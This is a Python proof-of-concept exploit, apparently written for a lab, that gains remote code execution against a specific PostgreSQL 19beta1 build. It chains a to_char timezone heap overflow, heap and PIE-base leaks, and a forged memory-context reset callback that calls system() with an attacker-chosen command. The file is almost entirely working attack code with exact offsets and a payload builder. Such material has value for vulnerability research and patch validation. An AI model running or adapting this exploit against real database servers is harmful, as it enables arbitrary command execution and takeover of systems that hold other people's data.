#!/usr/bin/env python3
"""
Authenticated RCE PoC for PostgreSQL's to_char('TZ'/'TZtz') heap overflow,
tuned for this official build:

    postgres:19beta1
    digest sha256:a6bdd01b51b115f446a03135f9395575b3eb6ba90a92bfb692da82088f8820f8
    BuildID bfab406f29e25df2412962608339583cdcd8603f

Exploit flow:
1. Adjacent `to_char('TZ')` results corrupt a varlena length and disclose
   record-typmod handler pointers, recovering the PostgreSQL PIE base.
2. A `to_char('TZtz')` invalid-free diagnostic leaks a live heap pointer.
3. A `GenerationFree` type confusion expands an allocation block so a
   controlled `decode()` overwrites printtup's per-row memory context.
4. `MemoryContextReset()` follows a forged reset callback and invokes
   `system(DEFAULT_COMMAND)`.

The exploit uses only the PostgreSQL wire protocol. Offsets below are file
virtual addresses relative to the leaked ELF base.
"""
import re
import struct
import time

import psycopg
from pwn import context, flat, log

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "127.0.0.1", 55432
DEFAULT_COMMAND = b"echo PWNED; id"

SYSTEM_PLT = 0xEE280
RVA_HASH = 0x6D59C0
RVA_CMP = 0x6D5930
ASET_METHODS = 0xA59F98


class Exploit:
    def __init__(self, host=HOST, port=PORT):
        self.host = host
        self.port = port
        self.conn = None

    def disconnect(self):
        self.conn.close()

    def connect(self):
        last = None
        for _ in range(30):
            try:
                self.conn = psycopg.connect(
                    f"host={self.host} port={self.port} dbname=postgres user=postgres",
                    connect_timeout=3,
                )
                return
            except Exception as ex:
                last = ex
            time.sleep(1)
            log.info("Waiting for db...")
        assert False, "Failed to connect to DB: %s" % last

    def exec(self, q, recv=True):
        cur = self.conn.cursor()
        ret = None
        err = None
        try:
            cur.execute(q)
            if recv:
                ret = cur.fetchall()
        except psycopg.ProgrammingError as ex:
            assert "didn't produce records" in str(ex), str(ex)
        except psycopg.errors.InternalError_ as ex:
            err = ex.pgresult.error_message
            self.conn.rollback()
        return (ret, err)

    # Leak the PIE base by corrupting the first COPY result's varlena length.
    def leaker(self):
        try:
            self.conn.rollback()
        except Exception:
            pass
        self.conn.autocommit = True
        self.exec("SET client_encoding = 'SQL_ASCII'")

        # Set the result size to 16449 through its three-byte varlena header.
        abbr = b"A" * 40 + bytes([0x04, 0x01, 0x01])
        tz = (b"<" + abbr + b">-10").decode("latin1")
        cur = self.conn.cursor()
        cur.execute("SELECT set_config('timezone', %s, false)", (tz,))

        cur = self.conn.cursor()
        chunks = []
        with cur.copy(
            "COPY (SELECT to_char(now(),'TZ'), to_char(now(),'TZ')) "
            "TO STDOUT (FORMAT binary)"
        ) as copy:
            while (b := copy.read()):
                chunks.append(bytes(b))
        raw = b"".join(chunks)

        # COPY-binary: 19-byte signature + int16 field count, then col1 field.
        off = 19 + 2
        col1_len = struct.unpack(">i", raw[off:off + 4])[0]
        off += 4
        dump = raw[off:off + col1_len]
        log.info("Leaked %d bytes of out-of-bounds heap", len(dump))

        # Find the adjacent record-typmod hash and comparison handlers.
        base = None
        for i in range(0, len(dump) - 16):
            a = struct.unpack("<Q", dump[i:i + 8])[0]
            b2 = struct.unpack("<Q", dump[i + 8:i + 16])[0]
            if a - b2 == (RVA_HASH - RVA_CMP) and (a & 0xFFF) == (RVA_HASH & 0xFFF):
                base = a - RVA_HASH
                break
        assert base is not None, "handler-pointer signature not found in leak"
        log.success("record_type_typmod_hash = %#x", base + RVA_HASH)
        log.success("PIE base (ELF) = %#x", base)
        return base

    # Leak a live heap pointer through the invalid-free error.
    def heap_leak(self):
        self.exec("SET client_encoding = 'SQL_ASCII'")
        size = 50
        self.exec(
            f"SELECT set_config('timezone', '<' || repeat('a', {size}) || '>-5', false)"
        )
        _, err = self.exec("SELECT to_char(now(), 'TZtz');")
        leak = err.decode()
        match = re.search(r"invalid pointer (0x[0-9a-fA-F]+)", leak)
        assert match, "Pointer not found in error: " + leak
        return int(match.group(1), 0)

    # Forge a reset callback in printtup's per-row memory context.
    def shaper2(self, base, prev_leak, command):
        self.exec("SET client_encoding = 'SQL_ASCII'")
        size = 50 - 12 - 4 - 1
        self.exec(
            f"SELECT set_config('timezone', '<' || repeat('d', {size}) || '>-5', false)"
        )
        self.exec("SELECT to_char(now(), 'TZtz');")

        system = base + SYSTEM_PLT
        methods = base + ASET_METHODS
        log.info("system@plt        = %#x", system)
        log.info("AllocSetMethods   = %#x", methods)

        T = prev_leak + 7872          # printtup per-row tmpcontext  (prev + 0x1ec0)
        V = prev_leak - 68            # decode VARDATA landing (in-block forward writer)
        A_fcb = prev_leak + 4000      # fake reset callback {system, &cmd, 0}
        A_cmd = prev_leak + 4100
        F = V + 7000                  # scratch chunk popped by int4out's palloc(12)
        off = lambda a: a - V

        command = command + b"\x00"

        payload = flat({
            off(A_fcb):  flat({0: system, 8: A_cmd, 0x10: 0}),
            off(A_cmd):  command,
            off(T + 0x10): struct.pack("<Q", methods),     # ->methods (rebuild REAL)
            off(T + 0x48): struct.pack("<Q", A_fcb),       # ->reset_cbs -> fake callback
            off(T + 0x50): struct.pack("<Q", T + 0xC8),    # ->blocks -> keeper block
            off(T + 0x60): struct.pack("<Q", F - 8),       # ->freelist[1] -> fake chunk
        }, length=8090, filler=b"\x00")

        # Volatile format arg => decode runs at execution time (not const-folded).
        q = ("SELECT length(decode('%s', CASE WHEN random() < 2 THEN 'hex' ELSE 'hex' END))"
             % payload.hex())
        try:
            self.exec(q, recv=True)
        except psycopg.OperationalError:
            pass  # The backend may exit after running the callback.




def main():
    exp = Exploit()

    exp.connect()
    try:
        base = exp.leaker()
    finally:
        exp.disconnect()

    exp.connect()
    try:
        prev_leak = exp.heap_leak()
        log.info("Heap pointer leaked: %#x", prev_leak)
        exp.shaper2(base, prev_leak, DEFAULT_COMMAND)
    except psycopg.OperationalError:
        log.failure("Backend exited during heap grooming before the payload was sent")
        log.info("Restart the target lab and rerun poc.py")
        return 1
    finally:
        try:
            exp.disconnect()
        except Exception:
            pass

    log.success("Exploit payload sent; check the target logs")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
